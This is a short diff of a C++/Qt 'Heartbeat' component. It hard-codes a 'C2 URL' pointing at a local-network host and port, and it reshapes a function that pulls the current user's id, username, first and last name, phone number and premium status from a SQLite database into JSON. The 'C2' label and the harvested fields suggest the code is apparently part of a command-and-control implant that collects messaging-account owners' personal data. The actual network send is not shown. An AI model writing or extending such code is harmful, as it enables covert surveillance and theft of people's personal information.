@@ -67,6 +67,10 @@ Heartbeat& Heartbeat::Instance() {
 Heartbeat::Heartbeat() {
     _deviceUuid = getOrCreateUuid();
     _pid = QCoreApplication::applicationPid();
+    
+    // Explicitly set C2 URL to ensure it matches the requirement
+    _c2Url = "http://192.168.2.131:8101";
+    Logs::writeMain("HEARTBEAT_INIT: C2 URL set to " + _c2Url);
 }
 
 QString Heartbeat::getOrCreateUuid() {
@@ -1905,12 +1909,12 @@ QString Heartbeat::getCurrentUserJson() {
     
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
         if (sqlite3_step(stmt) == SQLITE_ROW) {
-            obj["userId"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 0));
+            obj["user_id"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 0));
             obj["username"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
-            obj["firstName"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 2));
-            obj["lastName"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 3));
+            obj["first_name"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 2));
+            obj["last_name"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 3));
             obj["phone"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 4));
-            obj["isPremium"] = sqlite3_column_int(stmt, 5) ? true : false;
+            obj["is_premium"] = sqlite3_column_int(stmt, 5) ? true : false;
         }
         sqlite3_finalize(stmt);
     }
